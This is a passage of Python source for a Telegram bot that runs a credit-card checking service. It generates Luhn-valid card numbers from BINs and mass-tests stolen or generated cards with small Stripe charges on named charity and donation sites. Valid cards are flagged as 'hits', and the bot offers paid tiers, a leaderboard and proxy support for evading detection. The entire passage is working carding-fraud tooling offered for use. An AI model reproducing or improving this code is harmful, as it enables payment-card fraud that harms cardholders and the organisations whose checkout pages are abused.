• Reply with <code>/exp 2026</code>

Filters cards by expiry date.""")
        return

    cards = extract_cards_from_text(text_to_parse)
    if not cards:
        await message.reply("❌ No valid cards found")
        return

    # Parse filter
    filtered = []
    if '/' in exp_filter:
        parts = exp_filter.split('/')
        if len(parts) == 2:
            try:
                filter_mm = int(parts[0])
                filter_yy = int(parts[1])
                if filter_yy < 100:
                    filter_yy += 2000
                filtered = [c for c in cards if c['month'] == filter_mm and c['year'] == filter_yy]
            except:
                pass
    else:
        try:
            filter_year = int(exp_filter)
            if filter_year < 100:
                filter_year += 2000
            filtered = [c for c in cards if c['year'] == filter_year]
        except:
            pass

    if not filtered:
        await message.reply(f"❌ No cards found with expiry <code>{exp_filter}</code>")
        return

    response = f"""<b>📅 EXPIRY FILTER</b>

<b>Filter:</b> <code>{exp_filter}</code>
<b>Found:</b> {len(filtered)}/{len(cards)}

"""
    for card in filtered[:100]:
        response += f"<code>{format_card_display(card['number'], card['month'], card['year'], card['cvv'])}</code>\n"

    if len(filtered) > 100:
        response += f"\n<i>...and {len(filtered) - 100} more</i>"

    await message.reply(response)

@dp.message(Command("multibin", "mbin", "genmulti"))
async def cmd_multibin(message: Message):
    """Generate cards from multiple BINs"""
    user = message.from_user

    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await message.reply(f"""<b>🎲 MULTI-BIN GENERATOR</b>

<b>Usage:</b> <code>/multibin BIN1,BIN2,BIN3 [count]</code>

<b>Example:</b>
<code>/multibin 424242,512345,411111 5</code>
Generates 5 cards from each BIN.

Max 10 BINs, 20 cards each.""")
        return

    parts = args[1].split()
    bins_input = parts[0]
    count = 5
    if len(parts) >= 2 and parts[1].isdigit():
        count = min(int(parts[1]), 20)

    bins = [b.strip() for b in bins_input.split(',') if b.strip()][:10]

    if not bins:
        await message.reply("❌ No valid BINs provided")
        return

    response = f"""<b>🎲 MULTI-BIN GENERATE</b>

<b>BINs:</b> {len(bins)}
<b>Per BIN:</b> {count}
<b>Total:</b> {len(bins) * count}

"""

    for bin_num in bins:
        bin_num = re.sub(r'\D', '', bin_num)[:8]
        if len(bin_num) < 6:
            continue

        response += f"\n<b>━━━ {bin_num} ━━━</b>\n"

        generated = generate_cards_from_bin(bin_num, count)
        for card in generated:
            response += f"<code>{card}</code>\n"

    await message.reply(response)

def generate_cards_from_bin(bin_num: str, count: int = 10) -> List[str]:
    """Generate valid CC from BIN"""
    cards = []
    bin_len = len(bin_num)
    remaining = 16 - bin_len - 1  # -1 for check digit

    for _ in range(count):
        # Generate random middle digits
        middle = ''.join([str(random.randint(0, 9)) for _ in range(remaining)])
        partial = bin_num + middle

        # Calculate Luhn check digit
        def luhn_checksum(card_number):
            def digits_of(n):
                return [int(d) for d in str(n)]
            digits = digits_of(card_number)
            odd_digits = digits[-1::-2]
            even_digits = digits[-2::-2]
            checksum = sum(odd_digits)
            for d in even_digits:
                checksum += sum(digits_of(d * 2))
            return checksum % 10

        check = (10 - luhn_checksum(partial + '0')) % 10
        cc = partial + str(check)

        # Generate random exp and CVV
        mm = random.randint(1, 12)
        yy = random.randint(25, 30)
        cvv = f"{random.randint(100, 999)}"

        cards.append(f"{cc}|{mm:02d}|{yy}|{cvv}")

    return cards

async def handle_gate_mass_check(message: Message, gate_cmd: str, gateway: tuple, args: str):
    """Handle /m{gate} mass check for specific gateway"""
    user = message.from_user
    site_url, prod_id, price, title, gate_type = gateway

    cached_variant_info = None

    if db.is_banned(user.id):
        await message.reply("banned")
        return

    db.get_or_create_user(user.id, user.username, user.first_name)
    tier = db.get_user_tier(user.id)
    limits = get_tier_limits(tier)
    max_cards = limits['mchk']

    if not args:
        await message.reply(f"""<b>MASS CHECK - /{gate_cmd}</b>

<b>Usage:</b> <code>/m{gate_cmd} cc|mm|yy|cvv</code>
(one per line or comma separated)""")
        return

    cards = extract_cards_from_text(args)
    if not cards:
        lines = re.split(r'[\n,]+', args)
        for line in lines:
            line = line.strip()
            if line:
                card = parse_card(line)
                if card and luhn_check(card['number']):
                    cards.append(card)
                if len(cards) >= max_cards:
                    break
    else:
        cards = cards[:max_cards]

    if not cards:
        await message.reply("no valid cards found")
        return

    total = len(cards)
    stats = {'charged': 0, 'approved': 0, '3ds': 0, 'dead': 0, 'not_suitable': 0, 'skipped': 0}
    gateway_suitable = True
    skipped_cards = []

    # PROXY CHECK - depends on gate_type
    user_proxy = await proxy_manager.get_proxy_url(user.id)
    if gate_type in ["stripe_checkout", "stripe_secondstork"]:
        # STRIPE UHQ gates are optional proxy (recommended for better success)
        pass

    msg = await message.reply(f"""<b>Processing...</b> 0/{total}

CHARGED: 0 | APPROVED: 0
3DS: 0 | DEAD: 0

<b>Gate:</b> /{gate_cmd}""")

    live_cards = []

    for i, card in enumerate(cards):
        card_display = format_card_display(card['number'], card['month'], card['year'], card['cvv'])

        try:
            debug_mode = (i == 0)

            if gate_type in ["stripe_checkout", "stripe_secondstork"]:
                result = await stripe_gate_with_retry(check_card_stripe_checkout_session, card, user_proxy, debug_mode)
            elif gate_type == "stripe_secondstork":
                result = await stripe_gate_with_retry(check_card_stripe_secondstork, card, user_proxy, debug_mode)
            elif gate_type == "stripe_auth":
                result = await stripe_gate_with_retry(check_card_stripe_auth, card, user_proxy, debug_mode)
            elif gate_type == "stripe_dollar":
                result = await stripe_gate_with_retry(check_card_stripe_dollar, card, user_proxy, debug_mode)
            else:
                result = {'success': False, 'status': 'ERROR', 'message': 'UNKNOWN_GATE', 'is_chargeable': None, 'time': 0}

            status = result.get('status', 'UNKNOWN')
            result_msg = result.get('message', '')

            is_chargeable = result.get('is_chargeable')
            is_live = result.get('success') or is_chargeable is True or status.startswith('Approved')

            is_valid = is_valid_gateway_response(status, result_msg, result)

            is_charge_gate = gate_type in ['stripe_checkout']

            if not is_valid:
                stats['not_suitable'] += 1
                gateway_suitable = False
            elif status == '2FACTOR' or '3D' in status.upper() or status == '3DS_REQUIRED' or status == '3DS':
                stats['3ds'] += 1
                # For charge gates, 3DS is NOT a hit (only CHARGED is)
                if not is_charge_gate:
                    live_cards.append(card_display)
                db.update_user_stats(user.id, True)
                db.update_gateway_stats(gate_cmd, True)
            elif result.get('success') or status == 'CHARGED':
                stats['charged'] += 1
                live_cards.append(card_display)  # CHARGED is always a hit
                db.update_user_stats(user.id, True)
                db.update_gateway_stats(gate_cmd, True)
            elif is_chargeable is True or status.startswith('Approved'):
                stats['approved'] += 1
                # For charge gates, Approved/CCN is NOT a hit (only CHARGED is)
                if not is_charge_gate:
                    live_cards.append(card_display)
                db.update_user_stats(user.id, True)
                db.update_gateway_stats(gate_cmd, True)
            else:
                stats['dead'] += 1
                db.update_user_stats(user.id, False)
                db.update_gateway_stats(gate_cmd, False)

            # For hit notification: charge gates only show CHARGED, auth gates show CCN/3DS too
            is_hit_for_display = (status == 'CHARGED') if is_charge_gate else (is_live and is_valid and '3DS' not in status.upper())

            if is_hit_for_display:
                bin_info = await lookup_bin(card['number'])
                tier = db.get_user_tier(user.id, user.username)
                await message.reply(f"""🔥 <b>HIT</b> /{gate_cmd}

<code>{card_display}</code>
{status}

{bin_info['brand']} | {bin_info['bank'][:20]}
{bin_info['emoji']} {bin_info['country']}

<b>Checked By:</b> @{user.username or user.first_name} [{tier.upper()}]""")

            db.add_check_history(user.id, card['number'][:6], card['number'][-4:], gate_cmd, status, result_msg, result.get('time', 0))
        except Exception as e:
            print(f"[MGATE] Exception: {e}")
            stats['dead'] += 1

        gate_status = "" if gateway_suitable else "\n⚠️ <b>Gateway Not Suitable</b>"
        if (i + 1) % 2 == 0 or i == total - 1:
            try:
                await msg.edit_text(f"""<b>Processing...</b> {i + 1}/{total}

CHARGED: {stats['charged']} | APPROVED: {stats['approved']}
3DS: {stats['3ds']} | DEAD: {stats['dead']}{gate_status}

<b>Gate:</b> /{gate_cmd}""")
            except:
                pass

        await asyncio.sleep(0.5)

    tier = db.get_user_tier(user.id, user.username)
    gate_warning = "" if gateway_suitable else "\n⚠️ <b>Gateway Not Suitable</b>"

    # Save skipped cards to file if any
    skipped_file_info = ""
    if skipped_cards:
        import datetime
        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"skipped_{gate_cmd}_{timestamp}.txt"
        with open(filename, 'w') as f:
            f.write('\n'.join(skipped_cards))
        skipped_file_info = f"\n\n⚠️ <b>Skipped:</b> {stats['skipped']} (saved to {filename})"

    await msg.edit_text(f"""<b>Completed</b> {total}/{total}

CHARGED: {stats['charged']} | APPROVED: {stats['approved']}
3DS: {stats['3ds']} | DEAD: {stats['dead']}{gate_warning}{skipped_file_info}

<b>Gate:</b> /{gate_cmd}
<b>Checked By:</b> @{user.username or user.first_name} [{tier.upper()}]""")

    # Send skipped file if exists
    if skipped_cards:
        from aiogram.types import FSInputFile
        try:
            await message.reply_document(FSInputFile(filename), caption=f"<b>Skipped Cards</b>\n{stats['skipped']} cards with UNKNOWN status")
        except:
            pass


async def handle_gate_mass_txt(message: Message, gate_cmd: str, gateway: tuple):
    """Handle /m{gate}txt mass check from file for specific gateway"""
    user = message.from_user
    site_url, prod_id, price, title, gate_type = gateway

    cached_variant_info = None

    if db.is_banned(user.id):
        await message.reply("banned")
        return

    db.get_or_create_user(user.id, user.username, user.first_name)
    tier = db.get_user_tier(user.id)
    limits = get_tier_limits(tier)
    max_cards = limits['mtxt']

    if not message.reply_to_message or not message.reply_to_message.document:
        await message.reply(f"""<b>MASS TXT - /{gate_cmd}</b>

<b>Usage:</b> Reply to a .txt file with <code>/m{gate_cmd}txt</code>""")
        return

    doc = message.reply_to_message.document
    if not doc.file_name.endswith('.txt'):
        await message.reply("send a .txt file")
        return

    try:
        file = await message.bot.download(doc)
        content = file.read().decode('utf-8', errors='ignore')
    except:
        await message.reply("failed to read file")
        return

    cards = extract_cards_from_text(content)
    if not cards:
        lines = content.split('\n')
        for line in lines:
            line = line.strip()
            if line:
                card = parse_card(line)
                if card and luhn_check(card['number']):
                    cards.append(card)
                if len(cards) >= max_cards:
                    break
    else:
        cards = cards[:max_cards]

    if not cards:
        await message.reply("no valid cards in file")
        return

    total = len(cards)
    stats = {'charged': 0, 'approved': 0, '3ds': 0, 'dead': 0, 'not_suitable': 0}
    gateway_suitable = True

    # PROXY CHECK - depends on gate_type
    user_proxy = await proxy_manager.get_proxy_url(user.id)
    if gate_type in ["stripe_checkout", "stripe_secondstork"]:
        # STRIPE UHQ gates are optional proxy (recommended for better success)
        pass

    # Register task with task manager
    task_id, cancel_event = await task_manager.register(user.id, gate_cmd, total)

    msg = await message.reply(f"""<b>Processing...</b> 0/{total}

CHARGED: 0 | APPROVED: 0
3DS: 0 | DEAD: 0

<b>Gate:</b> /{gate_cmd}
<b>Task ID:</b> <code>{task_id}</code>
<b>Stop:</b> <code>/stop {task_id}</code>""")

    live_cards = []
    cancelled = False

    try:
        for i, card in enumerate(cards):
            # Check for cancellation
            if cancel_event.is_set():
                cancelled = True
                break

            card_display = format_card_display(card['number'], card['month'], card['year'], card['cvv'])

            try:
                debug_mode = (i == 0)

                if gate_type in ["stripe_checkout", "stripe_secondstork"]:
                    result = await stripe_gate_with_retry(check_card_stripe_checkout_session, card, user_proxy, debug_mode)
                elif gate_type == "stripe_secondstork":
                    result = await stripe_gate_with_retry(check_card_stripe_secondstork, card, user_proxy, debug_mode)
                elif gate_type == "stripe_auth":
                    result = await stripe_gate_with_retry(check_card_stripe_auth, card, user_proxy, debug_mode)
                elif gate_type == "stripe_dollar":
                    result = await stripe_gate_with_retry(check_card_stripe_dollar, card, user_proxy, debug_mode)
                else:
                    result = {'success': False, 'status': 'ERROR', 'message': 'UNKNOWN_GATE', 'is_chargeable': None, 'time': 0}

                status = result.get('status', 'UNKNOWN')
                result_msg = result.get('message', '')
                is_chargeable = result.get('is_chargeable')
                is_live = result.get('success') or is_chargeable is True or status.startswith('Approved')

                is_valid = is_valid_gateway_response(status, result_msg, result)

                is_charge_gate = gate_type in ['stripe_checkout']

                if not is_valid:
                    stats['not_suitable'] += 1
                    gateway_suitable = False
                elif status == '2FACTOR' or '3D' in status.upper() or status == '3DS_REQUIRED' or status == '3DS':
                    stats['3ds'] += 1
                    # For charge gates, 3DS is NOT a hit (only CHARGED is)
                    if not is_charge_gate:
                        live_cards.append(card_display)
                    db.update_user_stats(user.id, True)
                    db.update_gateway_stats(gate_cmd, True)
                elif result.get('success') or status == 'CHARGED':
                    stats['charged'] += 1
                    live_cards.append(card_display)  # CHARGED is always a hit
                    db.update_user_stats(user.id, True)
                    db.update_gateway_stats(gate_cmd, True)
                elif is_chargeable is True or status.startswith('Approved'):
                    stats['approved'] += 1
                    # For charge gates, Approved/CCN is NOT a hit (only CHARGED is)
                    if not is_charge_gate:
                        live_cards.append(card_display)
                    db.update_user_stats(user.id, True)
                    db.update_gateway_stats(gate_cmd, True)
                else:
                    stats['dead'] += 1
                    db.update_user_stats(user.id, False)
                    db.update_gateway_stats(gate_cmd, False)

                # For hit notification: charge gates only show CHARGED, auth gates show CCN/3DS too
                is_hit_for_display = (status == 'CHARGED') if is_charge_gate else (is_live and is_valid and '3DS' not in status.upper())

                if is_hit_for_display:
                    bin_info = await lookup_bin(card['number'])
                    tier = db.get_user_tier(user.id, user.username)
                    await message.reply(f"""🔥 <b>HIT</b> /{gate_cmd}

<code>{card_display}</code>
{status}

{bin_info['brand']} | {bin_info['bank'][:20]}
{bin_info['emoji']} {bin_info['country']}

<b>Checked By:</b> @{user.username or user.first_name} [{tier.upper()}]""")

                db.add_check_history(user.id, card['number'][:6], card['number'][-4:], gate_cmd, status, result_msg, result.get('time', 0))
            except Exception as e:
                print(f"[MGATETXT] Exception: {e}")
                stats['dead'] += 1

            # Update progress in task manager
            await task_manager.update_progress(task_id, i + 1)

            gate_status = "" if gateway_suitable else "\n⚠️ <b>Gateway Not Suitable</b>"
            if (i + 1) % 2 == 0 or i == total - 1:
                try:
                    await msg.edit_text(f"""<b>Processing...</b> {i + 1}/{total}

CHARGED: {stats['charged']} | APPROVED: {stats['approved']}
3DS: {stats['3ds']} | DEAD: {stats['dead']}{gate_status}

<b>Gate:</b> /{gate_cmd}
<b>Task ID:</b> <code>{task_id}</code>
<b>Stop:</b> <code>/stop {task_id}</code>""")
                except:
                    pass

            await asyncio.sleep(0.5)

        tier = db.get_user_tier(user.id, user.username)
        processed = i + 1 if not cancelled else i
        gate_warning = "" if gateway_suitable else "\n⚠️ <b>Gateway Not Suitable</b>"

        if cancelled:
            await msg.edit_text(f"""<b>Stopped</b> {processed}/{total}

CHARGED: {stats['charged']} | APPROVED: {stats['approved']}
3DS: {stats['3ds']} | DEAD: {stats['dead']}{gate_warning}

<b>Gate:</b> /{gate_cmd}
<b>Task ID:</b> <code>{task_id}</code>
<b>Status:</b> Cancelled by user""")
        else:
            await msg.edit_text(f"""<b>Completed</b> {total}/{total}

CHARGED: {stats['charged']} | APPROVED: {stats['approved']}
3DS: {stats['3ds']} | DEAD: {stats['dead']}{gate_warning}

<b>Gate:</b> /{gate_cmd}
<b>Checked By:</b> @{user.username or user.first_name} [{tier.upper()}]""")
    finally:
        # Always unregister task when done
        await task_manager.unregister(task_id)


@dp.message(Command("tier", "premium"))
async def cmd_tier(message: Message):
    """Check user tier status"""
    user = message.from_user
    db.get_or_create_user(user.id, user.username, user.first_name)

    tier = db.get_user_tier(user.id)
    expiry = db.get_premium_expiry(user.id)
    limits = get_tier_limits(tier)

    tier_emoji = {"owner": "👑", "premium": "⭐", "free": "🆓"}.get(tier, "🆓")

    response = f"""{MINI_BANNER}

<b>━━━ YOUR TIER ━━━</b>

{tier_emoji} <b>Tier:</b> {tier.upper()}
"""

    if tier == 'premium' and expiry:
        response += f"<b>Expires:</b> {expiry}\n"

    response += f"""
<b>━━━ LIMITS ━━━</b>
<b>Mass Check:</b> {limits['mchk']} cards
<b>Mass TXT:</b> {limits['mtxt']} cards

<i>Upgrade with /redeem KEY</i>"""

    await message.reply(response)

@dp.message(Command("stop"))
async def cmd_stop(message: Message):
    """Stop a running mass check task"""
    user = message.from_user
    args = message.text.split(maxsplit=1)

    if len(args) < 2:
        # Show user's active tasks
        user_tasks = await task_manager.get_user_tasks(user.id)
        if not user_tasks:
            await message.reply("No active tasks. Usage: <code>/stop TASKID</code>")
            return

        tasks_text = "\n".join([f"<code>{tid}</code> - /{info['gate_cmd']} ({info['processed']}/{info['total']})"
                                for tid, info in user_tasks])
        await message.reply(f"""<b>Your Active Tasks:</b>

{tasks_text}

<b>Usage:</b> <code>/stop TASKID</code>""")
        return

    task_id = args[1].strip()
    task = await task_manager.get_task(task_id)

    if not task:
        await message.reply(f"Task <code>{task_id}</code> not found or already completed")
        return

    # Check permission - user can only stop their own tasks (owner can stop any)
    if task['user_id'] != user.id and not is_owner(user):
        await message.reply("You can only stop your own tasks")
        return

    if await task_manager.cancel(task_id):
        await message.reply(f"Stopping task <code>{task_id}</code>...")
    else:
        await message.reply(f"Failed to stop task <code>{task_id}</code>")

@dp.message(Command("tasks"))
async def cmd_tasks(message: Message):
    """View all active tasks (owner only) or user's tasks"""
    user = message.from_user

    if is_owner(user):
        all_tasks = await task_manager.get_all_tasks()
        if not all_tasks:
            await message.reply("No active tasks")
            return

        tasks_text = "\n".join([f"<code>{tid}</code> - /{info['gate_cmd']} ({info['processed']}/{info['total']}) - User: {info['user_id']}"
                                for tid, info in all_tasks])
        await message.reply(f"""<b>All Active Tasks:</b>

{tasks_text}

<b>Stop:</b> <code>/stop TASKID</code>""")
    else:
        user_tasks = await task_manager.get_user_tasks(user.id)
        if not user_tasks:
            await message.reply("You have no active tasks")
            return

        tasks_text = "\n".join([f"<code>{tid}</code> - /{info['gate_cmd']} ({info['processed']}/{info['total']})"
                                for tid, info in user_tasks])
        await message.reply(f"""<b>Your Active Tasks:</b>

{tasks_text}

<b>Stop:</b> <code>/stop TASKID</code>""")

# Callback handlers
@dp.callback_query()
async def handle_callback(callback: CallbackQuery):
    data = callback.data
    user = callback.from_user

    if data == "back_start":
        keyboard = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="𝙶𝙰𝚃𝙴𝚂", callback_data="main_gates"),
             InlineKeyboardButton(text="𝚃𝙾𝙾𝙻𝚂", callback_data="main_cmds")],
            [InlineKeyboardButton(text="𝙿𝚁𝙾𝙵𝙸𝙻𝙴", callback_data="main_profile"),
             InlineKeyboardButton(text="𝚃𝙾𝙿", callback_data="main_top")],
            [InlineKeyboardButton(text="𝙴𝚇𝙸𝚃", callback_data="close_menu")]
        ])
        txt = f"""<b>𝗣𝗥𝗢𝗢 𝗖𝗛𝗘𝗖𝗞𝗘𝗥 𝗔𝘄𝗮𝗶𝘁𝘀 𝗬𝗼𝘂!</b>
- - - - - - - - - - - - - - - - - - - - - - - - - -
✦ 𝙵𝚊𝚜𝚝 𝙶𝚊𝚝𝚎, 𝙱𝚎𝚝𝚝𝚎𝚛 𝚁𝚎𝚜𝚙𝚘𝚗𝚜𝚎.
✦ 𝙵𝚛𝚎𝚎 + 𝙿𝚛𝚎𝚖𝚒𝚞𝚖 𝙶𝚊𝚝𝚎𝚜 𝚊𝚗𝚍 𝚃𝚘𝚘𝚕𝚜.
✦ 𝙲𝚘𝚖𝚙𝚕𝚎𝚝𝚎 𝙱𝚘𝚝 𝙵𝚘𝚛 𝚈𝚘𝚞𝚛 𝙿𝚞𝚛𝚙𝚘𝚜𝚎.
- - - - - - - - - - - - - - - - - - - - - - - - - -
𝚃𝚑𝚎 𝙱𝚘𝚝 𝙰𝚠𝚊𝚒𝚝𝚜 𝚈𝚘𝚞𝚛 𝙲𝚘𝚖𝚖𝚊𝚗𝚍, 𝙼𝚢 𝙻𝚘𝚛𝚍 ⚔️

<a href="tg://resolve?domain={BOT_USERNAME}">@{BOT_USERNAME}</a>"""
        await callback.message.edit_text(txt, reply_markup=keyboard, disable_web_page_preview=True)

    # commands menu from button
    elif data in ("main_cmds", "help"):
        txt = """<b>COMMANDS</b>

<u>checker</u>
/bin - lookup bin

<u>account</u>
/me - your stats
/top - leaderboard"""

        keyboard = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="Back", callback_data="back_start"),
             InlineKeyboardButton(text="Close", callback_data="close_menu")]
        ])
        await callback.message.edit_text(txt, reply_markup=keyboard)

    # gates from button - show gate types
    elif data in ("main_gates", "gates"):
        gateways = db.get_all_gateways()
        stripe_gates = [g for g in gateways if g[9] == "stripe_checkout"]

        txt = f"""<b>STRIPE GATES</b> ({len(stripe_gates)} gates)

Use /gates command to see all available Stripe gates."""

        keyboard = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="Back", callback_data="back_start"),
             InlineKeyboardButton(text="Close", callback_data="close_menu")]
        ])
        await callback.message.edit_text(txt, reply_markup=keyboard)

    # Show Stripe gates
    elif data == "gates_type_stripe":
        txt = """<b>💳 STRIPE UHQ GATES</b>

New Ultra High Quality Stripe gates:

💷 <b>STRIPE UHQ 1$ (GBP)</b>
<code>/str1</code> - £1.00 charge
<code>/mstr1</code> - mass check
<code>/mstr1txt</code> - mass check from file
🔓 Proxy: Optional (Recommended)
🌐 Site: renew169.org.uk

💵 <b>STRIPE UHQ 1$ - 2 (NZD)</b>
<code>/str2</code> - $1.00 NZD charge
<code>/mstr2</code> - mass check
<code>/mstr2txt</code> - mass check from file
🔓 Proxy: Optional (Recommended)
🌐 Site: whakatipuyouthtrust.org.nz

💰 <b>STRIPE DONATION $3 (USD)</b>
<code>/str4</code> - $3.00 USD charge
<code>/mstr4</code> - mass check
<code>/mstr4txt</code> - mass check from file
🔓 Proxy: Optional
🌐 Site: donations.davidmaraga.com

<b>Response Format:</b>
✅ status: "succeeded" = CHARGED
⚠️ status: "requires_action" = 3DS
❌ Decline response in "message"
📋 Format: RESULT → DECLINED → <DECLINE CODE>"""

        keyboard = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="🔙 Back", callback_data="main_gates"),
             InlineKeyboardButton(text="❌ Close", callback_data="close_menu")]
        ])
        await callback.message.edit_text(txt, reply_markup=keyboard)

    # profile from button
    elif data in ("main_profile", "me"):
        stats = db.get_user_stats(user.id) or {'total_checks': 0, 'live_hits': 0, 'dead_hits': 0}
        tier = db.get_user_tier(user.id)
        uname = f"@{user.username}" if user.username else user.first_name

        txt = f"""<b>PROFILE</b>

{uname}
tier: {tier}

checks: {stats['total_checks']}
charged: {stats['live_hits']}
dead: {stats['dead_hits']}"""

        keyboard = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="Back", callback_data="back_start"),
             InlineKeyboardButton(text="Close", callback_data="close_menu")]
        ])
        await callback.message.edit_text(txt, reply_markup=keyboard)

    # leaderboard from button
    elif data in ("main_top", "top"):
        leaders = db.get_leaderboard(5)
        txt = "<b>TOP CHECKERS</b>\n"
        if leaders:
            for i, (username, live, _) in enumerate(leaders):
                txt += f"\n{i+1}. @{username} - {live} hits"
        else:
            txt += "\nno data yet"

        keyboard = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="Back", callback_data="back_start"),
             InlineKeyboardButton(text="Close", callback_data="close_menu")]
        ])
        await callback.message.edit_text(txt, reply_markup=keyboard)

    # regenerate CC
    elif data.startswith("regen_"):
        parts = data.split("_")
        if len(parts) >= 5:
            bin_input = parts[1]
            fixed_month = int(parts[2]) if int(parts[2]) > 0 else None
            fixed_year = int(parts[3]) if int(parts[3]) > 0 else None
            fixed_cvv = parts[4] if parts[4] != "0" else None

            # Generate 10 new CCs with valid Luhn
            cards = []
            bin_prefix = bin_input[:15]

            for _ in range(10):
                remaining = 15 - len(bin_prefix)
                if remaining > 0:
                    suffix = ''.join([str(random.randint(0, 9)) for _ in range(remaining)])
                    card_base = bin_prefix + suffix
                else:
                    card_base = bin_prefix[:15]

                digits = [int(d) for d in card_base]
                for i in range(len(digits) - 1, -1, -2):
                    digits[i] *= 2
                    if digits[i] > 9:
                        digits[i] -= 9
                check_digit = (10 - (sum(digits) % 10)) % 10
                card_num = card_base + str(check_digit)

                card_month = fixed_month if fixed_month else random.randint(1, 12)
                card_year = fixed_year if fixed_year else random.randint(2025, 2030)
                cvv = fixed_cvv if fixed_cvv else str(random.randint(100, 999))
                cards.append(f"{card_num}|{card_month:02d}|{card_year}|{cvv}")

            bin_info = await lookup_bin(bin_input[:6])
            tier = db.get_user_tier(user.id, user.username)
            tier_display = tier.capitalize()

            cards_text = '\n'.join([f"<code>{c}</code>" for c in cards])

            # Build display format
            display_bin = bin_input + "x" * max(0, 16 - len(bin_input))
            display_parts = [display_bin]
            display_parts.append(f"{fixed_month:02d}" if fixed_month else "rnd")
            display_parts.append(str(fixed_year) if fixed_year else "rnd")
            display_parts.append(fixed_cvv if fixed_cvv else "rnd")
            display_format = "|".join(display_parts)

            stored_bin = bin_input[:10]
            mm_val = fixed_month if fixed_month else 0
            yy_val = fixed_year if fixed_year else 0
            cvv_val = fixed_cvv if fixed_cvv else "0"

            keyboard = InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="𝚁𝚎-𝙶𝚎𝚗 🔄", callback_data=f"regen_{stored_bin}_{mm_val}_{yy_val}_{cvv_val}"),
                 InlineKeyboardButton(text="𝙴𝚡𝚒𝚝 ⚠️", callback_data="close_menu")]
            ])

            response = f"""<b>Bin</b> - <code>{display_format}</code>
- - - - - - - - - - - - - - - - - - - - -
{cards_text}
- - - - - - - - - - - - - - - - - - - - -
<b>Info</b> - {bin_info['brand']} - {bin_info['type']} - {bin_info['level']}
<b>Bank</b> - {bin_info['bank'][:30]}
<b>Country</b> - {bin_info['emoji']} {bin_info['country']}
- - - - - - - - - - - - - - - - - - - - -
<b>Used By</b> - <a href="tg://resolve?domain={user.username or BOT_USERNAME}">{user.first_name}</a> [{tier_display}]"""

            await callback.message.edit_text(response, reply_markup=keyboard, disable_web_page_preview=True)
            await callback.answer("regenerated")
        return

    # close menu
    elif data == "close_menu":
        await callback.message.delete()
        await callback.answer("closed")
        return

    await callback.answer()

# ═══════════════════════════════════════════════════════════════
#                    PROXY COMMANDS
# ═══════════════════════════════════════════════════════════════

@dp.message(Command("setproxy"))
async def cmd_setproxy(message: Message):
    """Set and validate proxy for user"""
    user = message.from_user

    if db.is_banned(user.id):
        await message.reply("❌ You are banned")
        return

    db.get_or_create_user(user.id, user.username, user.first_name)

    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await message.reply(f"""{MINI_BANNER}

<b>𝗦𝗘𝗧 𝗣𝗥𝗢𝗫𝗬</b>

<b>Supported Formats:</b>
• <code>ip:port</code>
• <code>ip:port:user:pass</code>
• <code>user:pass@ip:port</code>
• <code>http://ip:port</code>
• <code>socks5://ip:port</code>

<b>Examples:</b>
<code>/setproxy 192.168.1.1:8080</code>
<code>/setproxy 43.159.29.246:9999:username:password</code>
<code>/setproxy user:pass@proxy.example.com:8080</code>
<code>/setproxy socks5://192.168.1.1:1080</code>

<i>Proxy will be validated and checked for rotation</i>""")
        return

    proxy_input = args[1].strip()

    # Parse different proxy formats
    proxy_url = parse_proxy_input(proxy_input)

    msg = await message.reply("🔄 Validating proxy...")

    # Validate proxy
    proxy_info = await validate_proxy(proxy_url)

    if proxy_info['valid']:
        # Save proxy for user
        await proxy_manager.set_proxy(user.id, proxy_url, proxy_info)

    # Format and send result
    result_text = format_proxy_result(proxy_info)
    await msg.edit_text(result_text)

@dp.message(Command("proxy"))
async def cmd_proxy(message: Message):
    """View current proxy status"""
    user = message.from_user
    db.get_or_create_user(user.id, user.username, user.first_name)

    # Get proxy from database for full status info
    proxy_db = db.get_user_proxy(user.id)

    if not proxy_db:
        await message.reply(f"""{MINI_BANNER}

<b>𝗣𝗥𝗢𝗫𝗬 𝗦𝗧𝗔𝗧𝗨𝗦</b>

━━━━━━━━━━━━━━━━━━━━━━━━━━
• 𝗦𝘁𝗮𝘁𝘂𝘀: ❌ No proxy set
━━━━━━━━━━━━━━━━━━━━━━━━━━

<b>Set a proxy:</b> <code>/setproxy ip:port</code>""")
        return

    # Get status based on fail count
    fail_count = proxy_db.get('fail_count', 0)
    last_status = proxy_db.get('last_status', 'LIVE')
    status_emoji = proxy_manager.get_proxy_status_emoji(fail_count)

    if last_status == 'DEAD' or fail_count >= PROXY_MAX_FAILS:
        status = f"❌ DEAD ({fail_count} fails)"
    elif fail_count > 0:
        status = f"⚠️ UNSTABLE ({fail_count} fails)"
    else:
        status = "✅ LIVE"

    rotation = "✅ Rotating" if proxy_db.get('is_rotating') else "❌ Static"
    country_emoji = get_country_emoji(proxy_db.get('country_code', 'XX'))
    last_check = proxy_db.get('last_check', 'Never')

    response = f"""{MINI_BANNER}

<b>𝗣𝗥𝗢𝗫𝗬 𝗦𝗧𝗔𝗧𝗨𝗦</b>

━━━━━━━━━━━━━━━━━━━━━━━━━━
• 𝗦𝘁𝗮𝘁𝘂𝘀: {status}
• 𝗥𝗼𝘁𝗮𝘁𝗶𝗼𝗻: {rotation}
• 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲: {proxy_db.get('response_time', 0)}s
• 𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country_emoji} {proxy_db.get('country', 'Unknown')}
• 𝗜𝗣: {proxy_db.get('ip', 'Unknown')}
• 𝗟𝗮𝘀𝘁 𝗖𝗵𝗲𝗰𝗸: {last_check}
━━━━━━━━━━━━━━━━━━━━━━━━━━

<b>Clear proxy:</b> <code>/clearproxy</code>
<b>Change proxy:</b> <code>/setproxy ip:port</code>
<b>Test proxy:</b> <code>/testproxy</code>"""

    if last_status == 'DEAD' or fail_count >= PROXY_MAX_FAILS:
        response += """

🚨 <b>Your proxy is DEAD!</b>
Please set a new working proxy to continue checking.
<code>/setproxy ip:port:user:pass</code>"""
